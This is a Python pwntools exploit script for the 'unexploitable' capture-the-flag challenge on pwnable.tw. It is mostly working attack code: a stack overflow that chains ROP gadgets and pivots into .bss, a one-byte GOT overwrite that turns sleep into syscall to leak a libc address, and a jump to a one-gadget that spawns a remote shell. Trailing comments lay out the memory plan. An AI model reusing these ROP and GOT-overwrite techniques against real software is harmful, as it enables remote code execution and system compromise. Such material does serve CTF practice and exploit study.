from pwn import *

local = False

if local:
	r = process("./unexploitable")
	alarm_off = 0xcc200
	syscall = alarm_off + 5
	gadget = 0x4526a
else:
	r = remote("chall.pwnable.tw", 10403)
	alarm_off = 0xcb650
	syscall = alarm_off + 5
	gadget = 0x4526a

sleep(3)

pop_rbp_ret = 0x400512
# 0x0000000000400600 : mov edi, dword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
pop_edi_ret = 0x400600
main = 0x400544
sleep = 0x400450

# overwrite stack
payload = p64(0)*3   # overwrite buf[0x10] + rbp
payload += p64(pop_rbp_ret)
payload += p64(0x601038)
payload += p64(main+23)
payload += b"\x00"*(0x100-len(payload))
r.send(payload)

# overwrite 24byte: start: (0x601038 - 0x10)
payload = p64(pop_edi_ret) + p64(0)*2
payload += p64(pop_rbp_ret)
payload += p64(0x601070)
payload += p64(main+23)
payload += b"\x00"*(0x100-len(payload))
r.send(payload)

# overwrite 24byte: start: (0x601070 - 0x10)
payload = p64(1) + p64(sleep) + p64(pop_rbp_ret)
payload += p64(pop_rbp_ret)
payload += p64(0x601088)
payload += p64(main+23)
payload += b"\x00"*(0x100-len(payload))
r.send(payload)

# overwrite 24byte: start (0x601088 - 0x10)
payload = p64(0x6010a0) + p64(main+23) + p64(main+50)  # as i explain it will be 0, but it can't, you only know why by debugging
payload += p64(pop_rbp_ret)
payload += p64(0x601020)
payload += p64(main+23)
payload += b"\x00"*(0x100-len(payload))
r.send(payload)

# overwrite 1byte in got_sleep to become syscall
payload = chr(int(hex(syscall)[-2:],16))
r.send(payload)

result = r.recv()[:8]
libc_base = u64(result) - syscall


payload = p64(0)*3 + p64(gadget + libc_base)
r.send(payload)

r.interactive()

'''
0x601000   read

0x601010   sleep  #(we overwrite 1 LBS byte of sleep --> syscall)   # after read 1byte --> rax = 1 --> to call write syscall, rax must be 1
0x601008   0
0x601020   0
0x601028   pop_edi_ret
0x601030

0x601060   1    #( <--edi )   # to call write: rdi=1
0x601068   sleep      # (now it's syscall, NOT sleep any more) # and here is the place we leak libc_base addr
0x601070   pop_rbp_ret    # read 1 last time to setup to call gadget
0x601078   0x6010a0
0x601080   main+23
0x601088   0   <---
0x601090   0
0x601098   0
0x6010a0   0
0x6010a8   gadget


- We need to setup these value in that memory area and rip = 0x601028
- To setup these value we have to make use of 24byte (0x10(buf) + 0x8(rbp)),
that means write 24byte each time  <-- This is the KEY to solve this challenge.
- You have to believe you can leak something important
'''

'''
- About this challenge:
+ No output function --> we leak nothing  (f*ck that)
+ No gadget for rax, rsi, rdx, and add gadget was modified too (f*ck that)
+ take input by READ instead of GETS (f*ck that)
+ It will fail when remote if we make len(input) < 0x100 (dmm)
'''
